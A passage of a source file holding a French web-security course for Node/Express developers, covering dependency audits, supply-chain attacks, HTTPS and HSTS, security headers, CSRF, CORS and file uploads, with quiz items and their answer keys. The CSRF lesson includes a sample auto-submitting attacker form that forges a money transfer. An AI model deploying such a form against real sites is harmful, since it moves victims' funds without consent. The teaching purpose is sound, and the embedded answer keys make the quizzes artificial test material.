          'Un projet Node ordinaire installe des centaines de paquets, la plupart indirects (les dépendances de tes dépendances). Une faille connue dans l’un d’eux est une faille dans ton application. L’OWASP en fait une catégorie à part : A06 « composants vulnérables et obsolètes » en 2021, élargie en 2025 en A03 « défaillances de la chaîne d’approvisionnement logicielle ».\n\nLes outils pour savoir où tu en es :\n• npm audit compare ton package-lock.json à la base d’avis de sécurité de GitHub ;\n• OSV (osv.dev) agrège les avis de nombreux écosystèmes ; osv-scanner l’interroge depuis ta machine ou la CI ;\n• Dependabot (ou Renovate) ouvre automatiquement des pull requests de mise à jour et des alertes sur GitHub.\n\nLire un rapport : la sévérité (souvent un score CVSS) ne dit pas tout. Demande-toi si le paquet part en production ou sert seulement au développement (npm audit --omit=dev), et si ton code utilise la fonction concernée.',
          'npm audit                 # toutes les dépendances\nnpm audit --omit=dev      # seulement ce qui part en production\nnpm audit fix             # mises à jour compatibles avec tes plages\nosv-scanner scan source -r .',
        ),
        match('Associe chaque outil à ce qu’il fait.', [
          ['npm audit', 'Comparer le lockfile aux avis de sécurité'],
          ['Dependabot', 'Ouvrir des PR de mise à jour'],
          ['osv-scanner', 'Interroger la base OSV'],
          ['npm ci', 'Installer exactement le lockfile'],
        ]),
        fill(
          'Limite l’audit aux dépendances qui partent en production.',
          'npm audit --omit=___',
          ['dev', 'prod', 'peer', 'optional'],
          'dev',
          'L’option --omit=dev ignore les devDependencies. Elles comptent quand même (elles tournent sur ta machine et ta CI), mais le risque n’est pas le même.',
        ),
        vf(
          'npm audit fix --force est toujours sans risque.',
          false,
          '--force peut installer des versions majeures, avec des changements incompatibles. Lis ce qui change et lance tes tests.',
        ),
        tip(
          'Le lockfile et les mises à jour régulières',
          'package.json contient des plages de versions (^4.19.0 accepte toute 4.x à partir de 4.19.0). Le package-lock.json fige la version exacte de chaque paquet, y compris les indirects, avec une empreinte d’intégrité. Il se versionne toujours.\n\n• En CI et en production, installe avec npm ci : il suit le lockfile à la lettre et échoue s’il ne correspond pas à package.json, au lieu de résoudre de nouvelles versions.\n• Mets à jour souvent et par petites étapes : passer d’une version vieille de trois ans à la dernière, en urgence le jour d’une faille, est bien plus risqué.\n• Supprime les dépendances inutilisées : chaque paquet en moins est une surface d’attaque en moins.\n• Lis les modifications du lockfile dans les pull requests : un nouveau paquet indirect inattendu mérite un coup d’œil.\n\nUne dépendance abandonnée (plus de version depuis des années, issues sans réponse) est un risque même sans faille connue aujourd’hui.',
        ),
        qcm(
          'Quelle commande utiliser pour installer les dépendances dans la CI ?',
          ['npm ci', 'npm install', 'npm update', 'npm install --force'],
          0,
          'npm ci installe exactement ce que dit le lockfile et échoue en cas d’incohérence : des builds reproductibles, sans surprise.',
        ),
        vf(
          'Le package-lock.json peut être ajouté au .gitignore, npm le régénère de toute façon.',
          false,
          'Sans lockfile, chaque installation peut tirer des versions différentes, y compris une version compromise publiée hier. Versionne-le.',
        ),
        qcm(
          'npm audit signale une faille critique dans un outil de test (devDependency). Quelle lecture est juste ?',
          [
            'C’est sans importance, à ignorer',
            'Il faut arrêter la production immédiatement',
            'Le risque touche la machine de dev et la CI, pas les utilisateurs : à corriger, avec une priorité adaptée',
            'Il faut supprimer le lockfile pour forcer la mise à jour',
          ],
          2,
          'Une devDependency ne part pas en production, mais elle s’exécute sur ton poste et ta CI, qui détiennent des secrets. On la met à jour sans paniquer.',
        ),
        order(
          'Remets dans l’ordre le traitement d’une alerte Dependabot.',
          [
            'Lire l’avis : paquet, versions touchées, gravité',
            'Vérifier si le paquet part en production et si la fonction est utilisée',
            'Fusionner la mise à jour proposée dans une branche',
            'Lancer les tests puis déployer',
          ],
          'Comprendre avant d’agir, puis appliquer la correction dans le circuit normal, tests compris.',
        ),
      ]),

      lesson('chaine-appro', 'Paquets malveillants et chaîne d’approvisionnement', [
        tip(
          'Quand le paquet lui-même est l’attaque',
          'Une faille accidentelle n’est pas le seul danger : certains paquets sont malveillants dès le départ ou le deviennent.\n\n• Typosquatting : un paquet au nom presque identique à un paquet connu (une lettre en moins, un tiret en plus) qui attend une faute de frappe.\n• Compte de mainteneur compromis : une version piégée d’un paquet légitime est publiée.\n• Scripts d’installation : preinstall et postinstall s’exécutent sur ta machine à chaque npm install, avec tes droits, donc tes clés SSH et tes fichiers .env à portée.\n• Confusion de dépendances : un paquet public porte le même nom qu’un paquet interne de ton entreprise.\n\nDes cas réels l’ont montré : en 2018, le paquet event-stream a reçu une dépendance malveillante qui visait un portefeuille de bitcoins ; en 2024, une porte dérobée a été découverte dans xz-utils, un outil de compression présent dans de nombreuses distributions Linux, après des années de préparation par un faux contributeur.',
          '# Avant d’installer un paquet inconnu :\nnpm view nom-du-paquet          # auteur, versions, dépôt\nnpm install --ignore-scripts    # pas de scripts d’installation\nnpm audit signatures            # signatures et attestations du registre',
        ),
        qcm(
          'Tu tapes npm install expres au lieu de express. Quel risque ?',
          [
            'Aucun, npm corrige automatiquement',
            'Installer un paquet de typosquatting qui exécute du code',
            'Seulement une erreur « paquet introuvable »',
            'Une installation plus lente',
          ],
          1,
          'Les noms proches des paquets populaires sont réservés exprès par des attaquants. Vérifie le nom, l’auteur et le dépôt avant d’installer.',
        ),
        vf(
          'Un script postinstall peut exécuter n’importe quelle commande sur ta machine pendant npm install.',
          true,
          'C’est pour cela que --ignore-scripts (ou ignore-scripts=true dans .npmrc) est une protection utile, en autorisant au cas par cas les paquets qui en ont besoin.',
        ),
        fill(
          'Installe les dépendances sans exécuter leurs scripts d’installation.',
          'npm ci --___',
          ['ignore-scripts', 'no-audit', 'omit=dev', 'force'],
          'ignore-scripts',
          '--ignore-scripts empêche preinstall, install et postinstall de s’exécuter. Certains paquets natifs en ont besoin : on les autorise au cas par cas.',
        ),
        tip(
          'Protéger aussi ta CI et ton compte npm',
          'Ta chaîne d’approvisionnement, ce sont aussi tes outils de build :\n\n• GitHub Actions : épingle les actions tierces sur un SHA de commit complet plutôt que sur une étiquette comme @v4, qui peut être déplacée vers un code piégé. Donne au GITHUB_TOKEN les permissions minimales (permissions: contents: read par défaut).\n• Secrets de CI : seulement dans les jobs qui en ont besoin, jamais affichés dans les journaux.\n• Compte npm ou GitHub : double authentification obligatoire si tu publies des paquets.\n• SBOM (CycloneDX, SPDX) : une liste lisible de tous les composants de ton application, utile pour savoir en quelques minutes si tu es touché par la prochaine faille annoncée.\n\nEnfin, avant d’ajouter une dépendance pour trois lignes de code, demande-toi si tu ne peux pas les écrire toi-même.',
          'permissions:\n  contents: read\n\nsteps:\n  # épinglé sur un commit précis, pas sur une étiquette mobile\n  - uses: actions/checkout@<sha-complet-du-commit>',
        ),
        qcm(
          'Comment référencer une action GitHub tierce de la façon la plus sûre ?',
          [
            'Par le SHA complet d’un commit',
            'Par la branche main',
            'Par l’étiquette de version majeure (@v4)',
            'Par l’étiquette latest',
          ],
          0,
          'Une étiquette ou une branche peut être déplacée vers un autre code. Un SHA de commit désigne un contenu fixe.',
        ),
        vf(
          'Un paquet très téléchargé ne peut pas être compromis.',
          false,
          'Les paquets populaires sont justement des cibles de choix : la prise de contrôle d’un compte de mainteneur touche des milliers de projets d’un coup.',
        ),
        match('Associe chaque attaque à sa parade.', [
          ['Typosquatting', 'Vérifier nom, auteur et dépôt'],
          ['postinstall malveillant', '--ignore-scripts'],
          ['Étiquette d’action déplacée', 'Épingler sur un SHA'],
          ['Compte npm volé', 'Double authentification'],
        ]),
        order(
          'Remets dans l’ordre l’ajout prudent d’une nouvelle dépendance.',
          [
            'Se demander si la dépendance est vraiment nécessaire',
            'Vérifier le nom exact, l’auteur et le dépôt source',
            'Regarder l’activité : dernières versions, issues, mainteneurs',
            'Installer, puis relire le diff du lockfile dans la PR',
          ],
          'Chaque paquet ajouté hérite d’un accès à ta machine, ta CI et ta production : il mérite deux minutes de vérification.',
        ),
      ]),
    ],
  ),

  // ─── Thème 4 : configuration et HTTPS ──────────────────────────────────────
  unit(
    'configuration',
    'Configuration et HTTPS',
    'Servir tout le site en HTTPS avec HSTS, poser les en-têtes de sécurité utiles, masquer les erreurs internes et journaliser ce qui compte.',
    [
      lesson('https-hsts', 'HTTPS partout, avec HSTS', [
        tip(
          'Pourquoi tout le site, et pas seulement la connexion',
          'TLS (le S de HTTPS) chiffre les échanges et prouve au navigateur qu’il parle bien à ton domaine. Sans lui, sur un wifi public, chez un fournisseur d’accès ou sur n’importe quel équipement intermédiaire, quelqu’un peut lire les mots de passe et les cookies, ou modifier la page pour y injecter du code.\n\n• Toutes les pages, toutes les ressources : une seule page en HTTP suffit à exposer un cookie sans Secure ou à servir un script modifié.\n• Les certificats sont gratuits (Let’s Encrypt) et se renouvellent automatiquement avec certbot ou chez la plupart des hébergeurs.\n• TLS 1.2 au minimum, TLS 1.3 de préférence. TLS 1.0 et 1.1 sont officiellement abandonnés.\n• Redirige HTTP vers HTTPS avec un code 301.\n• Contenu mixte : une page HTTPS qui charge un script en HTTP voit ce script bloqué par le navigateur. Charge tout en HTTPS.\n\nDerrière un proxy ou un hébergeur qui termine TLS, Express voit une requête HTTP : app.set("trust proxy", 1) lui fait lire X-Forwarded-Proto, pour que req.secure et les cookies Secure fonctionnent.',
        ),
        tip(
          'HSTS : HTTPS sans exception',
          'Même avec une redirection, la toute première requête tapée « monshop.example » part en HTTP, et un attaquant placé sur le réseau peut l’intercepter (attaque par rétrogradation, ou SSL stripping).\n\nL’en-tête Strict-Transport-Security dit au navigateur : pendant max-age secondes, ne viens ici qu’en HTTPS, et refuse de passer outre une erreur de certificat.\n• max-age=31536000 : un an ;\n• includeSubDomains : s’applique aussi aux sous-domaines, vérifie qu’ils sont tous en HTTPS avant de l’activer ;\n• preload : permet l’inscription dans la liste intégrée aux navigateurs, qui protège même la toute première visite.\n\nLe navigateur ignore cet en-tête s’il le reçoit en HTTP : il ne compte que sur une réponse HTTPS. Commence avec un max-age court pour tester, puis allonge.',
          'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
        ),
        qcm(
          'Quel est le rôle de l’en-tête Strict-Transport-Security ?',
          [
            'Chiffrer les cookies',
            'Bloquer les scripts en ligne',
            'Obliger le navigateur à n’utiliser que HTTPS pour ce domaine',
            'Renouveler le certificat automatiquement',
          ],
          2,
          'Après l’avoir reçu, le navigateur réécrit tout lien http:// en https:// pour ce domaine pendant max-age secondes.',
        ),
        fill(
          'Active HSTS pour un an.',
          'Strict-Transport-Security: max-age=___; includeSubDomains',
          ['31536000', '365', '8760', '3600'],
          '31536000',
          'max-age est en secondes : 365 × 24 × 3600 = 31 536 000.',
        ),
        vf(
          'Un navigateur respecte l’en-tête HSTS même s’il le reçoit dans une réponse HTTP.',
          false,
          'Un attaquant pourrait sinon injecter ou supprimer l’en-tête en HTTP. Le navigateur ne le prend en compte que sur une connexion HTTPS valide.',
        ),
        qcm(
          'Ta page HTTPS charge http://cdn.example/carte.js. Que se passe-t-il dans un navigateur moderne ?',
          [
            'Le script est bloqué : c’est du contenu mixte actif',
            'Le script se charge normalement',
            'Le script se charge, avec un avertissement',
            'Toute la page passe en HTTP',
          ],
          0,
          'Un script chargé en HTTP pourrait être modifié en chemin et prendre le contrôle de la page : les navigateurs le bloquent.',
        ),
        qcm(
          'Ton API Express tourne derrière un proxy qui gère HTTPS. Les cookies Secure ne sont jamais envoyés. Que manque-t-il ?',
          [
            'Un second certificat sur Express',
            'app.set("trust proxy", 1)',
            'Désactiver Secure sur les cookies',
            'Passer le proxy en HTTP',
          ],
          1,
          'Sans trust proxy, Express croit la requête en HTTP et refuse de poser un cookie Secure. Avec, il lit X-Forwarded-Proto envoyé par le proxy.',
        ),
        match('Associe chaque élément à son rôle.', [
          ['Let’s Encrypt', 'Certificats gratuits renouvelés automatiquement'],
          ['Redirection 301', 'Envoyer HTTP vers HTTPS'],
          ['HSTS', 'Interdire HTTP pour les visites suivantes'],
          ['preload', 'Protéger aussi la première visite'],
        ]),
      ]),

      lesson('entetes', 'Les en-têtes de sécurité', [
        tip(
          'Quelques lignes qui ferment des portes',
          'Les navigateurs savent appliquer des protections, à condition que ton serveur les demande par des en-têtes HTTP :\n\n• Content-Security-Policy : d’où peuvent venir scripts, styles, images et connexions. Le meilleur filet contre le XSS.\n• Strict-Transport-Security : HTTPS obligatoire (leçon précédente).\n• X-Content-Type-Options: nosniff : le navigateur respecte le Content-Type annoncé au lieu de deviner, ce qui empêche d’exécuter comme script un fichier téléversé.\n• frame-ancestors (dans la CSP), ou l’ancien X-Frame-Options: DENY : interdit d’afficher ton site dans une iframe d’un autre, contre le détournement de clic (clickjacking).\n• Referrer-Policy: strict-origin-when-cross-origin : ne pas envoyer les URL complètes, qui peuvent contenir des jetons, aux autres sites.\n• Permissions-Policy : couper caméra, micro ou géolocalisation si tu ne t’en sers pas.\n\nRetire aussi X-Powered-By: Express, qui annonce ta technologie. Et X-XSS-Protection est obsolète : on le met à 0, car l’ancien filtre créait lui-même des failles.\n\nAvec Express, le paquet helmet pose une bonne base de tous ces en-têtes en une ligne.',
          'import helmet from "helmet"\n\napp.use(helmet()) // CSP de base, HSTS, nosniff, frame-ancestors, Referrer-Policy…\napp.disable("x-powered-by")',
        ),
        match('Associe chaque en-tête à la menace qu’il réduit.', [
          ['Content-Security-Policy', 'XSS'],
          ["frame-ancestors 'none'", 'Détournement de clic'],
          ['X-Content-Type-Options: nosniff', 'Fichier exécuté avec le mauvais type'],
          ['Strict-Transport-Security', 'Rétrogradation vers HTTP'],
          ['Referrer-Policy', 'Fuite d’URL vers d’autres sites'],
        ]),
        fill(
          'Pose les en-têtes de sécurité courants sur ton API Express.',
          'import helmet from "helmet"\napp.use(___())',
          ['helmet', 'cors', 'express.json', 'morgan'],
          'helmet',
          'helmet() ajoute en une ligne une CSP par défaut, HSTS, nosniff, la protection contre les iframes et d’autres en-têtes, que tu peux ensuite ajuster.',
        ),
        qcm(
          'Un site malveillant affiche ta page de paiement dans une iframe transparente au-dessus d’un faux bouton. Quelle directive l’empêche ?',
          [
            "script-src 'self'",
            "frame-ancestors 'none'",
            "img-src 'self'",
            'upgrade-insecure-requests',
          ],
          1,
          "frame-ancestors dit quels sites ont le droit d’afficher ta page dans un cadre. 'none' l’interdit à tous.",
        ),
        tip(
          'Écrire et déployer une CSP',
          "Une CSP se lit directive par directive. default-src sert de valeur par défaut ; les autres l’affinent : script-src, style-src, img-src, connect-src (appels fetch et WebSocket), font-src, frame-ancestors.\n\nPour la déployer sans casser le site :\n1. Commence par l’en-tête Content-Security-Policy-Report-Only : le navigateur signale les violations sans rien bloquer.\n2. Corrige ou autorise ce qui doit l’être (ton CDN, ton API, ton outil de mesure d’audience).\n3. Passe à Content-Security-Policy quand les rapports sont propres.\n\nÀ éviter : 'unsafe-inline' et 'unsafe-eval' dans script-src, ou une liste de domaines si large qu’elle inclut des CDN publics où n’importe qui peut héberger un script.\n\nUne CSP peut aussi être posée par une balise <meta>, mais certaines directives, dont frame-ancestors, n’y fonctionnent pas : préfère l’en-tête HTTP.",
          "Content-Security-Policy:\n  default-src 'self';\n  script-src 'self';\n  img-src 'self' data: https://images.monshop.example;\n  connect-src 'self' https://api.monshop.example;\n  object-src 'none';\n  frame-ancestors 'none'",
        ),
        qcm(
          'Tu veux tester une CSP en production sans risquer de casser le site. Que faire ?',
          [
            'La mettre dans un commentaire HTML',
            'L’envoyer seulement aux administrateurs',
            "Ajouter 'unsafe-inline' partout",
            'Utiliser Content-Security-Policy-Report-Only',
          ],
          3,
          'En mode Report-Only, le navigateur signale ce qu’il aurait bloqué, sans rien bloquer. On passe au mode normal une fois les rapports propres.',
        ),
        vf(
          'Il faut activer X-XSS-Protection: 1; mode=block pour protéger les navigateurs modernes.',
          false,
          'Ce filtre a été retiré des navigateurs modernes et pouvait lui-même créer des failles. La recommandation actuelle est 0, et une vraie CSP.',
        ),
        vf(
          'La directive frame-ancestors fonctionne aussi dans une CSP posée par une balise <meta>.',
          false,
          'frame-ancestors (comme report-uri et sandbox) est ignorée dans une balise <meta>. Il faut l’en-tête HTTP.',
        ),
        fill(
          'Empêche le navigateur de deviner le type des fichiers servis.',
          'X-Content-Type-Options: ___',
          ['nosniff', 'deny', 'strict', 'none'],
          'nosniff',
          'nosniff force le navigateur à respecter le Content-Type annoncé : une image téléversée qui contient du HTML ou du JavaScript ne sera pas interprétée comme tel.',
        ),
      ]),

      lesson('erreurs-logs', 'Erreurs, mode debug et journaux', [
        tip(
          'Une mauvaise configuration ouvre la porte',
          'La mauvaise configuration de sécurité (A05 en 2021, A02 en 2025 dans le Top 10 de l’OWASP) regroupe les erreurs de réglage plutôt que de code :\n\n• messages d’erreur détaillés envoyés au client : trace de pile, requête SQL, chemins du serveur, versions ;\n• mode debug ou de développement laissé en production ;\n• identifiants par défaut jamais changés (admin/admin sur un panneau, une base, un routeur) ;\n• dossiers .git ou fichiers .env accessibles depuis le web ;\n• base de données ou Redis ouverts sur Internet au lieu d’être joignables seulement depuis le serveur ;\n• listage des répertoires activé, routes de test oubliées, documentation d’API interne publique.\n\nAvec Express, NODE_ENV=production change le comportement du gestionnaire d’erreurs par défaut, qui n’envoie plus la trace de pile. Mieux encore : écris ton propre gestionnaire, qui journalise le détail côté serveur et renvoie au client un message générique avec un identifiant pour retrouver l’incident.',
          'app.use((err, req, res, next) => {\n  const id = crypto.randomUUID()\n  logger.error({ id, err, route: req.path })\n  res.status(500).json({ erreur: "Erreur interne", reference: id })\n})',
        ),
        qcm(
          'Une requête provoque une exception. Que renvoyer au client ?',
          [
            'La trace de pile complète, pour aider au débogage',
            'Le texte de la requête SQL qui a échoué',
            'Un message générique et une référence, le détail restant dans les journaux',
            'Rien, on coupe la connexion',
          ],
          2,
          'La trace de pile révèle chemins, versions et structure de la base. Le client reçoit une référence ; toi, tu retrouves le détail dans les journaux.',
        ),
        fill(
          'Lance l’API Express en mode production.',
          '___=production node dist/server.js',
          ['NODE_ENV', 'MODE', 'ENV', 'EXPRESS_MODE'],
          'NODE_ENV',
          'Express et de nombreuses bibliothèques lisent NODE_ENV. En production, le gestionnaire d’erreurs par défaut cache la trace de pile.',
        ),
        qcm(
          'https://monshop.example/.git/config s’affiche dans le navigateur. Quel est le risque ?',
          [
            'Aucun, ce n’est qu’un fichier de configuration',
            'Seulement la révélation de la branche courante',
            'Un ralentissement du site',
            'On peut reconstituer le code source, et parfois des secrets de l’historique',
          ],
          3,
          'Des outils récupèrent tout le dépôt depuis un dossier .git exposé. Ne déploie que le résultat du build, et bloque les fichiers commençant par un point.',
        ),
        tip(
          'Journaliser ce qui compte, sans fuite',
          'Sans journaux, tu ne sauras ni qu’une attaque a lieu, ni ce qu’elle a touché. L’OWASP en fait une catégorie à part (A09 en 2021 et 2025).\n\nÀ journaliser, avec date, identifiant utilisateur, adresse IP et route :\n• les connexions réussies et échouées, les réinitialisations de mot de passe ;\n• les refus d’accès (401, 403) et les dépassements de limite (429) ;\n• les actions d’administration et les changements de droits ;\n• les paiements et remboursements.\n\nÀ ne jamais journaliser : mots de passe, codes OTP, jetons de session ou d’API, numéros de carte complets, codes PIN. Attention aux journaux qui recopient tout le corps des requêtes : ils capturent ces données sans que tu le veuilles.\n\nEnfin, un journal que personne ne lit ne sert à rien : prévois des alertes sur les pics d’échecs de connexion. Et en cas d’erreur inattendue dans une vérification, échoue fermé : refuse l’accès plutôt que de le laisser passer. L’édition 2025 a d’ailleurs ajouté une catégorie sur la mauvaise gestion des conditions exceptionnelles (A10).',
        ),
        vf(
          'Journaliser le corps complet des requêtes de connexion aide au débogage et ne pose pas de problème.',
          false,
          'Le corps contient le mot de passe en clair. Toute personne qui lit les journaux, ou qui les vole, l’obtient.',
        ),
        qcm(
          'Le service qui vérifie les droits ne répond pas. Que doit faire ton middleware ?',
          [
            'Refuser l’accès (échouer fermé)',
            'Laisser passer pour ne pas gêner l’utilisateur',
            'Laisser passer seulement les requêtes GET',
            'Réessayer indéfiniment',
          ],
          0,
          'Une panne ne doit jamais ouvrir l’accès. On refuse, on journalise, et on affiche un message clair à l’utilisateur.',
        ),
        match('À journaliser ou pas ? Associe.', [
          ['Échec de connexion avec l’e-mail visé', 'À journaliser'],
          ['Mot de passe saisi', 'Jamais'],
          ['Changement de rôle par un admin', 'À journaliser avec l’auteur'],
          ['Code OTP envoyé par SMS', 'Jamais en clair'],
        ]),
        order(
          'Remets dans l’ordre le gestionnaire d’erreurs Express.',
          [
            'app.use((err, req, res, next) => {',
            '  const id = crypto.randomUUID()',
            '  logger.error({ id, err })',
            '  res.status(500).json({ erreur: "Erreur interne", reference: id })',
            '})',
          ],
          'Un gestionnaire d’erreurs Express a quatre paramètres et se déclare après les routes. On journalise le détail, on renvoie une référence.',
        ),
      ]),
    ],
  ),

  // ─── Compléments : navigateur, fichiers et requêtes sortantes ─────────────
  unit(
    'navigateur-fichiers',
    'CSRF, CORS, téléversements et SSRF',
    'Bloquer les requêtes forgées depuis un autre site, configurer CORS sans ouvrir ton API, accepter des fichiers en sécurité et empêcher ton serveur d’appeler n’importe quoi.',
    [
      lesson('csrf', 'CSRF : la requête forgée', [
        tip(
          'Le navigateur envoie tes cookies tout seul',
          'La falsification de requête intersite (CSRF) exploite un comportement normal : quand une page déclenche une requête vers ton site, le navigateur joint les cookies de ton site. Si la victime est connectée et visite une page piégée, celle-ci peut soumettre automatiquement un formulaire vers /api/transfert, et ton serveur voit une requête authentifiée.\n\nL’attaquant ne lit pas la réponse : il fait agir la victime. Les cibles typiques : changer l’e-mail du compte, envoyer de l’argent, ajouter un administrateur.\n\nQui est concerné ? Les applications qui s’authentifient par cookie (ou authentification HTTP de base). Une API qui exige un en-tête Authorization: Bearer ajouté par ton JavaScript n’est pas exposée de cette façon, car le navigateur n’ajoute pas cet en-tête tout seul.\n\nPremière règle : une requête GET ne modifie jamais rien. Un lien ou une image suffirait sinon à déclencher l’action.',
          '<!-- Sur pirate.example -->\n<form action="https://monshop.example/api/transfert" method="POST">\n  <input name="vers" value="+22990000000">\n  <input name="montant" value="50000">\n</form>\n<script>document.forms[0].submit()</script>',
        ),
        tip(
          'Les défenses qui marchent',
          '• SameSite=Lax ou Strict sur le cookie de session : le navigateur ne l’envoie pas avec un POST venu d’un autre site. Lax est d’ailleurs la valeur par défaut de Chrome quand l’attribut manque, mais ne compte pas dessus : écris-le.\n• Jeton anti-CSRF : une valeur aléatoire liée à la session, placée dans chaque formulaire ou en-tête, et vérifiée par le serveur. La page piégée ne peut pas la connaître.\n• Vérifier l’origine : les en-têtes Origin et Sec-Fetch-Site indiquent d’où vient la requête ; refuse les requêtes qui modifient des données quand elles viennent d’un autre site.\n• Demander une confirmation (mot de passe, code) pour les actions les plus sensibles.\n\nLe paquet csurf, longtemps utilisé avec Express, est déprécié depuis 2022 : utilise une bibliothèque maintenue ou combine SameSite et vérification de l’origine. Et souviens-toi qu’un seul XSS contourne toutes ces protections, puisque le script tourne sur ton propre site.',
          'app.use((req, res, next) => {\n  const modifie = !["GET", "HEAD", "OPTIONS"].includes(req.method)\n  if (modifie && req.get("Sec-Fetch-Site") === "cross-site") {\n    return res.sendStatus(403)\n  }\n  next()\n})',
        ),
        qcm(
          'Quelle application est exposée au CSRF classique ?',
          [
            'Une API qui exige un en-tête Authorization: Bearer ajouté par le front',
            'Un site statique sans connexion',
            'Une application dont la session est dans un cookie, sans SameSite ni jeton',
            'Une application mobile native qui appelle une API',
          ],
          2,
          'Le CSRF repose sur l’envoi automatique des cookies par le navigateur. Un en-tête Bearer n’est pas ajouté automatiquement.',
        ),
        vf(
          'Une route GET /api/supprimer-compte est acceptable si elle exige d’être connecté.',
          false,
          'Une simple balise <img src="…/api/supprimer-compte"> sur un autre site déclencherait la suppression. Les actions passent par POST, PUT, PATCH ou DELETE.',
        ),
        fill(
          'Empêche l’envoi du cookie de session avec les POST venus d’autres sites.',
          'res.cookie("sid", id, { httpOnly: true, secure: true, sameSite: "___" })',
          ['lax', 'none', 'any', 'cross'],
          'lax',
          'SameSite=Lax bloque le cookie sur les requêtes intersites autres que la navigation de premier niveau en GET. "strict" serait encore plus fermé.',
        ),
        qcm(
          'Pourquoi un jeton anti-CSRF bloque-t-il l’attaque ?',
          [
            'Il chiffre le formulaire',
            'Il remplace le cookie de session',
            'Il ralentit les requêtes automatiques',
            'La page piégée ne peut pas connaître sa valeur, liée à la session',
          ],
          3,
          'Le site de l’attaquant ne peut pas lire tes pages (même origine), donc pas le jeton. Sa requête forgée arrive sans jeton valide et est refusée.',
        ),
        match('Associe chaque défense à son principe.', [
          ['SameSite=Lax', 'Le cookie ne part pas avec un POST intersite'],
          ['Jeton anti-CSRF', 'Une valeur que l’attaquant ne peut pas deviner'],
          ['Sec-Fetch-Site', 'Savoir si la requête vient d’un autre site'],
          ['Pas d’action en GET', 'Un lien ou une image ne modifie rien'],
        ]),
        vf(
          'Si ton site a une faille XSS, les jetons anti-CSRF ne protègent plus.',
          true,
          'Le script injecté tourne sur ton origine : il lit le jeton dans la page et l’ajoute à ses requêtes. Le XSS se corrige en premier.',
        ),
      ]),

      lesson('cors', 'CORS sans contresens', [
        tip(
          'Ce que CORS est, et ce qu’il n’est pas',
          'Par défaut, la politique de même origine (same-origin policy) empêche le JavaScript d’un site de lire les réponses d’un autre. Une origine, c’est le trio protocole, domaine et port : https://monshop.example et https://api.monshop.example sont deux origines différentes.\n\nCORS (Cross-Origin Resource Sharing) est un moyen pour ton serveur d’assouplir cette règle : avec l’en-tête Access-Control-Allow-Origin, il dit au navigateur quelles origines peuvent lire ses réponses.\n\nLe contresens courant : CORS ne protège pas ton serveur. C’est le navigateur qui l’applique. curl, Postman ou un script Python ignorent CORS et appellent ton API comme ils veulent. L’authentification et le contrôle d’accès restent indispensables sur chaque route.\n\nPour les requêtes « non simples » (méthode PUT ou DELETE, Content-Type: application/json, en-têtes personnalisés), le navigateur envoie d’abord une requête OPTIONS de contrôle préalable (preflight) pour demander la permission.',
        ),
        tip(
          'La configuration dangereuse et la bonne',
          'Le danger vient des cookies. Avec Access-Control-Allow-Credentials: true, le navigateur joint les cookies et laisse le site autorisé lire la réponse. Si ton serveur recopie n’importe quel en-tête Origin dans Access-Control-Allow-Origin, alors n’importe quel site peut lire les données privées de tes utilisateurs connectés.\n\n• Access-Control-Allow-Origin: * est interdit par les navigateurs avec les cookies : c’est voulu.\n• Avec des cookies, utilise une liste blanche d’origines exactes.\n• Ne valide pas avec un includes ou une fin de chaîne naïve : monshop.example.pirate.example contient monshop.example.\n• N’autorise pas l’origine null, qui peut venir de pages en sandbox ou de fichiers locaux.\n• Une API publique sans cookies (taux de change, catalogue) peut répondre * sans problème.',
          'import cors from "cors"\n\napp.use(cors({\n  origin: ["https://monshop.example", "https://admin.monshop.example"],\n  credentials: true,\n}))',
        ),
        vf(
          'Une configuration CORS stricte empêche un script curl d’appeler ton API.',
          false,
          'CORS est appliqué par le navigateur. Hors navigateur, n’importe qui appelle ton API : l’authentification et l’autorisation restent obligatoires.',
        ),
        qcm(
          'Quelle configuration est dangereuse ?',
          [
            'Allow-Origin: * sur une API publique sans cookies',
            'Recopier n’importe quel Origin reçu, avec Allow-Credentials: true',
            'Une liste blanche de deux origines avec credentials: true',
            'Aucun en-tête CORS sur une API utilisée par le même domaine',
          ],
          1,
          'Tout site peut alors lire les réponses authentifiées de tes utilisateurs connectés : profils, commandes, soldes.',
        ),
        fill(
          'Autorise l’envoi des cookies pour les origines de la liste blanche.',
          'app.use(cors({ origin: ORIGINES_AUTORISEES, ___: true }))',
          ['credentials', 'cookies', 'withCredentials', 'allowAll'],
          'credentials',
          'Avec le paquet cors, credentials: true ajoute Access-Control-Allow-Credentials: true. Côté front, fetch a aussi besoin de credentials: "include".',
        ),
        qcm(
          'Lesquelles de ces deux adresses ont la même origine ? https://monshop.example et…',
          [
            'http://monshop.example',
            'https://monshop.example:8443',
            'https://api.monshop.example',
            'https://monshop.example/panier',
          ],
          3,
          'Le chemin ne compte pas. Changer le protocole, le port ou le sous-domaine change l’origine.',
        ),
        vf(
          'Un navigateur accepte Access-Control-Allow-Origin: * avec Access-Control-Allow-Credentials: true.',
          false,
          'Cette combinaison est refusée par la spécification : avec des cookies, l’origine autorisée doit être précise.',
        ),
        match('Associe chaque terme à sa définition.', [
          ['Origine', 'Protocole, domaine et port'],
          ['Preflight', 'Requête OPTIONS de permission préalable'],
          ['Allow-Credentials', 'Autoriser les cookies et leur réponse'],
          ['Same-origin policy', 'Règle par défaut du navigateur'],
        ]),
      ]),

      lesson('uploads-ssrf', 'Téléversements et SSRF', [
        tip(
          'Accepter un fichier sans se faire piéger',
          'Un formulaire de téléversement (photo de profil, pièce d’identité, justificatif de paiement) est une porte vers ton serveur. Les règles :\n\n• Limite la taille (limits.fileSize avec multer) et le nombre de fichiers, sinon un seul envoi peut remplir le disque.\n• Vérifie le vrai type à partir des premiers octets du fichier (signature, ou « magic bytes », avec le paquet file-type). L’extension et le Content-Type sont choisis par le client.\n• Génère toi-même le nom du fichier (un UUID) : jamais le nom d’origine, qui peut contenir ../ ou écraser un autre fichier.\n• Stocke hors du dossier servi par le site, ou dans un stockage objet, pour qu’un fichier ne soit jamais exécuté par le serveur.\n• Sers les fichiers avec le bon Content-Type, nosniff, et Content-Disposition: attachment pour ce qui n’est pas une image. Un SVG ou un HTML ouvert sur ton domaine peut contenir du JavaScript.\n• Ré-encode les images (avec sharp, par exemple) : tu élimines les contenus piégés et les métadonnées EXIF, qui peuvent contenir la position GPS de la photo.',
